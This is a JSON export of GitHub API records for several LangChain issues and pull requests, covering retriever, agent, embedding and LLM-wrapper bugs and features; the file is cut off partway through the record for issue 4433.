[
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4441",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4441/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4441/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4441/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4441",
        "id": 1703245543,
        "node_id": "I_kwDOIPDwls5lhXbn",
        "number": 4441,
        "title": "Langchain -self query retreiver using chromadb/faiss ",
        "user": {
            "login": "prabhatnawani89",
            "id": 49978184,
            "node_id": "MDQ6VXNlcjQ5OTc4MTg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/49978184?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/prabhatnawani89",
            "html_url": "https://github.com/prabhatnawani89",
            "followers_url": "https://api.github.com/users/prabhatnawani89/followers",
            "following_url": "https://api.github.com/users/prabhatnawani89/following{/other_user}",
            "gists_url": "https://api.github.com/users/prabhatnawani89/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/prabhatnawani89/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/prabhatnawani89/subscriptions",
            "organizations_url": "https://api.github.com/users/prabhatnawani89/orgs",
            "repos_url": "https://api.github.com/users/prabhatnawani89/repos",
            "events_url": "https://api.github.com/users/prabhatnawani89/events{/privacy}",
            "received_events_url": "https://api.github.com/users/prabhatnawani89/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-10T06:56:08Z",
        "updated_at": "2023-07-19T18:19:24Z",
        "closed_at": "2023-05-10T09:33:17Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\r\nos : windows 11 \r\n\r\nI am trying to test the langchain selfretiever using chromadb and getting the below error.\r\n\r\nretriever = SelfQueryRetriever.from_llm(llm, vectorstore = vectordb, document_contents = document_content_description,metadata_field_info = metadata_field_info, verbose=True)\r\n\r\nI have also persisted vector store on disk and still facing the same error however the same code works on google colab.)\r\n\r\n**Error**\r\nValueError: Self query retriever with Vector Store type not supported.\r\n\r\n\r\n### Who can help?\r\n\r\n\r\n\r\n_No response_\r\n\r\n### Information\r\n\r\n- [x] The official example notebooks/scripts\r\n- [ ] My own modified scripts\r\n\r\n### Related Components\r\n\r\n- [x] LLMs/Chat Models\r\n- [x] Embedding Models\r\n- [ ] Prompts / Prompt Templates / Prompt Selectors\r\n- [ ] Output Parsers\r\n- [ ] Document Loaders\r\n- [x] Vector Stores / Retrievers\r\n- [ ] Memory\r\n- [ ] Agents / Agent Executors\r\n- [ ] Tools / Toolkits\r\n- [ ] Chains\r\n- [ ] Callbacks/Tracing\r\n- [ ] Async\r\n\r\n### Reproduction\r\n\r\nhttps://python.langchain.com/en/latest/modules/indexes/retrievers/examples/self_query_retriever.html\r\n\r\n### Expected behavior\r\n\r\nValueError: Self query retriever with Vector Store type  not supported.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4441/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4441/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4440",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4440/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4440/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4440/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4440",
        "id": 1703221602,
        "node_id": "I_kwDOIPDwls5lhRli",
        "number": 4440,
        "title": "Splitting response in Generative Agents truncates the result too much",
        "user": {
            "login": "ifsheldon",
            "id": 39153080,
            "node_id": "MDQ6VXNlcjM5MTUzMDgw",
            "avatar_url": "https://avatars.githubusercontent.com/u/39153080?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ifsheldon",
            "html_url": "https://github.com/ifsheldon",
            "followers_url": "https://api.github.com/users/ifsheldon/followers",
            "following_url": "https://api.github.com/users/ifsheldon/following{/other_user}",
            "gists_url": "https://api.github.com/users/ifsheldon/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ifsheldon/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ifsheldon/subscriptions",
            "organizations_url": "https://api.github.com/users/ifsheldon/orgs",
            "repos_url": "https://api.github.com/users/ifsheldon/repos",
            "events_url": "https://api.github.com/users/ifsheldon/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ifsheldon/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2023-05-10T06:35:34Z",
        "updated_at": "2023-12-04T16:08:14Z",
        "closed_at": "2023-12-04T16:08:13Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### System Info\n\nLangchain: 0.0.162\r\nPython: 3.10\r\nPlatform: Linux\n\n### Who can help?\n\n_No response_\n\n### Information\n\n- [ ] The official example notebooks/scripts\n- [X] My own modified scripts\n\n### Related Components\n\n- [ ] LLMs/Chat Models\n- [ ] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [ ] Output Parsers\n- [ ] Document Loaders\n- [ ] Vector Stores / Retrievers\n- [ ] Memory\n- [X] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [ ] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\nYou can ask a Generative Agent to respond, say, asking a question like \"give me the lyrics of a song\", then the multiline response is trivially truncated due to the below line\r\nhttps://github.com/hwchase17/langchain/blob/f0cfed636f37ea7c5171541e0df3f814858f1550/langchain/experimental/generative_agents/generative_agent.py#LL160C9-L160C52\n\n### Expected behavior\n\ndo not truncate multiline response.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4440/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4440/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4439",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4439/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4439/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4439/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4439",
        "id": 1703199089,
        "node_id": "I_kwDOIPDwls5lhMFx",
        "number": 4439,
        "title": "Issue: Multi input tools do not work consistently with conversational agent",
        "user": {
            "login": "radsrigari",
            "id": 131835871,
            "node_id": "U_kgDOB9un3w",
            "avatar_url": "https://avatars.githubusercontent.com/u/131835871?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/radsrigari",
            "html_url": "https://github.com/radsrigari",
            "followers_url": "https://api.github.com/users/radsrigari/followers",
            "following_url": "https://api.github.com/users/radsrigari/following{/other_user}",
            "gists_url": "https://api.github.com/users/radsrigari/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/radsrigari/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/radsrigari/subscriptions",
            "organizations_url": "https://api.github.com/users/radsrigari/orgs",
            "repos_url": "https://api.github.com/users/radsrigari/repos",
            "events_url": "https://api.github.com/users/radsrigari/events{/privacy}",
            "received_events_url": "https://api.github.com/users/radsrigari/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-10T06:14:56Z",
        "updated_at": "2023-10-23T16:08:43Z",
        "closed_at": "2023-10-23T16:08:42Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Issue you'd like to raise.\n\nWe are unable to make multi input tools work consistently with conversational agent.\r\n\r\nHere is the scenario: User asks a question. Based on the question the agent needs to extract two inputs from the question and route it to the right tool for answer. If the user has not provided the two inputs, the agent needs to ask the user for those inputs, before using the tool. Finally it also needs to remember the inputs and not ask for those inputs again in subsequent messages from the user. I've tried various methods ranging from structured tool, structured agent, even regex matching, and nothing is producing consistent results.\r\n\r\nCould anyone please suggest any other ideas to solve this? Thank You!\n\n### Suggestion:\n\n_No response_",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4439/reactions",
            "total_count": 3,
            "+1": 3,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4439/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4438",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4438/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4438/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4438/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4438",
        "id": 1703146087,
        "node_id": "I_kwDOIPDwls5lg_Jn",
        "number": 4438,
        "title": "Run locally google flan t5 large issue with local embeddings",
        "user": {
            "login": "axeljeremy7",
            "id": 16569050,
            "node_id": "MDQ6VXNlcjE2NTY5MDUw",
            "avatar_url": "https://avatars.githubusercontent.com/u/16569050?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/axeljeremy7",
            "html_url": "https://github.com/axeljeremy7",
            "followers_url": "https://api.github.com/users/axeljeremy7/followers",
            "following_url": "https://api.github.com/users/axeljeremy7/following{/other_user}",
            "gists_url": "https://api.github.com/users/axeljeremy7/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/axeljeremy7/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/axeljeremy7/subscriptions",
            "organizations_url": "https://api.github.com/users/axeljeremy7/orgs",
            "repos_url": "https://api.github.com/users/axeljeremy7/repos",
            "events_url": "https://api.github.com/users/axeljeremy7/events{/privacy}",
            "received_events_url": "https://api.github.com/users/axeljeremy7/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2023-05-10T05:20:10Z",
        "updated_at": "2023-10-31T16:07:30Z",
        "closed_at": "2023-10-31T16:07:29Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\r\n\r\nlangchainversion: 0.0.163\r\nllama_index version: 0.6.4\r\nPyTorch version: 2.0.0+cu118\r\nTransformers version: 4.30.0.dev0\r\n\r\n### Who can help?\r\n\r\n_No response_\r\n\r\n### Information\r\n\r\n- [X] The official example notebooks/scripts\r\n- [ ] My own modified scripts\r\n\r\n### Related Components\r\n\r\n- [X] LLMs/Chat Models\r\n- [X] Embedding Models\r\n- [ ] Prompts / Prompt Templates / Prompt Selectors\r\n- [ ] Output Parsers\r\n- [x] Document Loaders\r\n- [ ] Vector Stores / Retrievers\r\n- [ ] Memory\r\n- [ ] Agents / Agent Executors\r\n- [ ] Tools / Toolkits\r\n- [ ] Chains\r\n- [ ] Callbacks/Tracing\r\n- [ ] Async\r\n\r\n### Reproduction\r\n\r\nRun: \r\n\r\n```python\r\n\r\nfrom llama_index import LLMPredictor, PromptHelper, ServiceContext, SimpleDirectoryReader, GPTVectorStoreIndex, GPTListIndex\r\n\r\nmodel_id = 'google/flan-t5-large'\r\ntokenizer = AutoTokenizer.from_pretrained(model_id)\r\nmodel = AutoModelForSeq2SeqLM.from_pretrained(model_id)\r\npipe = pipeline(\r\n    \"text2text-generation\",\r\n    model=model, \r\n    tokenizer=tokenizer, \r\n    max_length=512\r\n)\r\n\r\nlocal_llm_g_flan_t5_large = HuggingFacePipeline(pipeline=pipe)\r\nprint(local_llm_g_flan_t5_large('What is the capital of Germany? '))\r\nprint(local_llm_g_flan_t5_large('What is the capital of Spain? '))\r\nprint(local_llm_g_flan_t5_large('What is the capital of Canada? '))\r\n# all is working untill here\r\n\r\nfrom llama_index import GPTListIndex, SimpleDirectoryReader, GPTVectorStoreIndex\r\nfrom langchain.embeddings import SentenceTransformerEmbeddings \r\nfrom llama_index import LangchainEmbedding, ServiceContext\r\n\r\ndirectory_path_ = '/content/dir'\r\n documents = SimpleDirectoryReader(directory_path_).load_data()\r\n\r\nllm_predictor = LLMPredictor(llm=local_llm_g_flan_t5_large)\r\nembed_model = SentenceTransformerEmbeddings(model_name=\"all-MiniLM-L6-v2\")\r\nservice_context = ServiceContext.from_defaults(embed_model=embed_model, llm_predictor=llm_predictor)\r\nindex = GPTListIndex.from_documents(documents, service_context=service_context)\r\n\r\n```\r\n\r\n```\r\n---------------------------------------------------------------------------\r\nAttributeError                            Traceback (most recent call last)\r\n<ipython-input-62-7d7e68b85aa2> in <cell line: 1>()\r\n----> 1 index = GPTListIndex.from_documents(documents, service_context=service_context)\r\n\r\n5 frames\r\n/usr/local/lib/python3.10/dist-packages/llama_index/token_counter/token_counter.py in wrapper_logic(_self)\r\n     48 \r\n     49             start_token_ct = llm_predictor.total_tokens_used\r\n---> 50             start_embed_token_ct = embed_model.total_tokens_used\r\n     51 \r\n     52             yield\r\n\r\nAttributeError: 'HuggingFaceEmbeddings' object has no attribute 'total_tokens_used'\r\n```\r\n\r\n### Expected behavior\r\n\r\nif try by using huggiface hub , it works fine but locally the same it does not work, my idea is to do context learning locally using this model",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4438/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4438/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4437",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4437/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4437/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4437/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4437",
        "id": 1703106397,
        "node_id": "I_kwDOIPDwls5lg1dd",
        "number": 4437,
        "title": "Unable to provide llm_chain (instead of llm) to initialize_agent() while initializing the agent",
        "user": {
            "login": "gdevanla",
            "id": 1274371,
            "node_id": "MDQ6VXNlcjEyNzQzNzE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1274371?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/gdevanla",
            "html_url": "https://github.com/gdevanla",
            "followers_url": "https://api.github.com/users/gdevanla/followers",
            "following_url": "https://api.github.com/users/gdevanla/following{/other_user}",
            "gists_url": "https://api.github.com/users/gdevanla/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/gdevanla/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/gdevanla/subscriptions",
            "organizations_url": "https://api.github.com/users/gdevanla/orgs",
            "repos_url": "https://api.github.com/users/gdevanla/repos",
            "events_url": "https://api.github.com/users/gdevanla/events{/privacy}",
            "received_events_url": "https://api.github.com/users/gdevanla/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2023-05-10T04:32:01Z",
        "updated_at": "2023-10-09T16:07:58Z",
        "closed_at": "2023-10-09T16:07:57Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\n\nLangChain version : 0.0.158\r\nPython version: 11\r\nMac OS Ventura 13.2.1\n\n### Who can help?\n\n_No response_\n\n### Information\n\n- [ ] The official example notebooks/scripts\n- [X] My own modified scripts\n\n### Related Components\n\n- [ ] LLMs/Chat Models\n- [ ] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [ ] Output Parsers\n- [ ] Document Loaders\n- [ ] Vector Stores / Retrievers\n- [ ] Memory\n- [X] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [ ] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\nI am using an agent to integrate with the \"serpapi\" tool. But, I also need to partially initialize a prompt to inform OpenAI on how to use the serpapi tool. For example, I want to set up the prompt with the current_date, before OpenAPI starts interacting with serp_api.  To solve this problem, I am trying to use `llm_chain` as the parameter instead of an `llm` instance.  But, currently the `initialize_agent` function only accepts an instance of `llm` and not the `llm_agent` tool.\r\n\r\n```\r\ndef run_search_chain_serpapi(user_input, current_date=None):\r\n    if not current_date:\r\n        current_date =  f\"{datetime.datetime.now():%Y-%m-%d}\"\r\n    llm = OpenAI(temperature=0)\r\n    prompt = PromptTemplate(\r\n        input_variables=[\"input\", \"current_date\"],\r\n        template=_DEFAULT_SEARCH_PROMPT\r\n    )\r\n    partial_prompt = prompt.partial(current_date=\"2023-05-09\")\r\n\r\n    llm_chain = LLMChain(llm=llm, prompt=partial_prompt)\r\n    tools = load_tools([setup_serpi_tool()])\r\n    agent = initialize_agent(tools, llm_chain, agent=AgentType.ZERO_SHOT_REACT_DESCRIPTION, verbose=True)\r\n    # Now let's test it out!\r\n    result = agent(user_input)\r\n    return result\r\n```\r\n\r\nI get the following error, while running this function:\r\n\r\n```\r\nValidationError: 1 validation error for LLMChain\r\nllm\r\n  Can't instantiate abstract class BaseLanguageModel with abstract methods agenerate_prompt, generate_prompt (type=type_error)\r\n```\r\n\r\n\n\n### Expected behavior\n\nI believe given the LangChain is composable, the `agent` should be able to also accept an instance of `llm_chain` and not just plain `llm` instances.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4437/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4437/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4436",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4436/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4436/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4436/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4436",
        "id": 1703091812,
        "node_id": "PR_kwDOIPDwls5QJj9F",
        "number": 4436,
        "title": "Jupyter Notebook Example for using Mongodb to store Chat Message History",
        "user": {
            "login": "jj701",
            "id": 129657162,
            "node_id": "U_kgDOB7ppSg",
            "avatar_url": "https://avatars.githubusercontent.com/u/129657162?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jj701",
            "html_url": "https://github.com/jj701",
            "followers_url": "https://api.github.com/users/jj701/followers",
            "following_url": "https://api.github.com/users/jj701/following{/other_user}",
            "gists_url": "https://api.github.com/users/jj701/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jj701/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jj701/subscriptions",
            "organizations_url": "https://api.github.com/users/jj701/orgs",
            "repos_url": "https://api.github.com/users/jj701/repos",
            "events_url": "https://api.github.com/users/jj701/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jj701/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-10T04:12:53Z",
        "updated_at": "2023-05-15T21:33:42Z",
        "closed_at": "2023-05-15T21:33:42Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4436",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4436",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4436.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4436.patch",
            "merged_at": "2023-05-15T21:33:42Z"
        },
        "body": "# Jupyter Notebook Example for using Mongodb Chat Message History\r\n\r\n@dev2049 ",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4436/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4436/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4435",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4435/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4435/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4435/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4435",
        "id": 1703047837,
        "node_id": "PR_kwDOIPDwls5QJaw4",
        "number": 4435,
        "title": "Add support for max_tokens = -1 for LlamaCPP",
        "user": {
            "login": "masands",
            "id": 18495437,
            "node_id": "MDQ6VXNlcjE4NDk1NDM3",
            "avatar_url": "https://avatars.githubusercontent.com/u/18495437?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/masands",
            "html_url": "https://github.com/masands",
            "followers_url": "https://api.github.com/users/masands/followers",
            "following_url": "https://api.github.com/users/masands/following{/other_user}",
            "gists_url": "https://api.github.com/users/masands/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/masands/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/masands/subscriptions",
            "organizations_url": "https://api.github.com/users/masands/orgs",
            "repos_url": "https://api.github.com/users/masands/repos",
            "events_url": "https://api.github.com/users/masands/events{/privacy}",
            "received_events_url": "https://api.github.com/users/masands/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5680700873,
                "node_id": "LA_kwDOIPDwls8AAAABUpidyQ",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/auto:improvement",
                "name": "auto:improvement",
                "color": "FBCA04",
                "default": false,
                "description": "Medium size change to existing code to handle new use-cases"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2023-05-10T03:14:14Z",
        "updated_at": "2023-11-07T04:36:38Z",
        "closed_at": "2023-11-07T04:36:37Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4435",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4435",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4435.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4435.patch",
            "merged_at": null
        },
        "body": "# Calculate max_tokens\r\n\r\nAdded a '_get_max_tokens' function to the LlamaCpp wrapper to calculate the max_tokens if the max_token paramter is set to -1 (similar to the BaseOpenAI wrapper). Setting max_tokens = -1 returns as many tokens as possible given the prompt and the models maximal context size.\r\n\r\n## Who can review?\r\n@agola11\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4435/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4435/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4434",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4434/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4434/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4434/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4434",
        "id": 1703039981,
        "node_id": "PR_kwDOIPDwls5QJZFx",
        "number": 4434,
        "title": "Added LLM wrapper for the HuggingFace text-generation API",
        "user": {
            "login": "dcbark01",
            "id": 16838332,
            "node_id": "MDQ6VXNlcjE2ODM4MzMy",
            "avatar_url": "https://avatars.githubusercontent.com/u/16838332?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dcbark01",
            "html_url": "https://github.com/dcbark01",
            "followers_url": "https://api.github.com/users/dcbark01/followers",
            "following_url": "https://api.github.com/users/dcbark01/following{/other_user}",
            "gists_url": "https://api.github.com/users/dcbark01/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dcbark01/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dcbark01/subscriptions",
            "organizations_url": "https://api.github.com/users/dcbark01/orgs",
            "repos_url": "https://api.github.com/users/dcbark01/repos",
            "events_url": "https://api.github.com/users/dcbark01/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dcbark01/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-10T03:03:34Z",
        "updated_at": "2023-05-13T13:31:46Z",
        "closed_at": "2023-05-13T13:31:45Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4434",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4434",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4434.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4434.patch",
            "merged_at": null
        },
        "body": "# Added Feature for HF text-generation LLM wrapper\r\n\r\nBasically just adds a feature (and simple tests) to allow usage of the HuggingFace [`text-generation`](https://github.com/huggingface/text-generation-inference) LLM inference API. It works really well for both streaming and non-streaming outputs.\r\n\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nFixes # (issue)\r\n- [Issue 4433](https://github.com/hwchase17/langchain/issues/4433)\r\n\r\n## Before submitting\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\n\r\nExample Usage:\r\n\r\n```python\r\n# Both of these examples assume you already have a local LLM server\r\n# running. See the HuggingFace text-generation documentation for more\r\n# information on how to do this.\r\nfrom langchain.llms import HuggingFaceTextgen\r\n\r\nprompt = \"What is Deep Learning?\"\r\nhost = \"localhost\"\r\nport = 8080\r\n\r\n# Basic example (no streaming)\r\nllm = HuggingFaceTextgen(host=host, port=port)\r\nprint(llm(prompt))\r\n\r\n# Streaming response example\r\nfrom langchain.callbacks import streaming_stdout\r\n\r\ncallbacks = [streaming_stdout.StreamingStdOutCallbackHandler()]\r\nllm = HuggingFaceTextgen(\r\n    host=host,\r\n    port=port,\r\n    callbacks=callbacks,\r\n    stream=True\r\n)\r\nprint(llm(prompt))\r\n```\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4434/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4434/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4433",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4433/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4433/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4433/events",
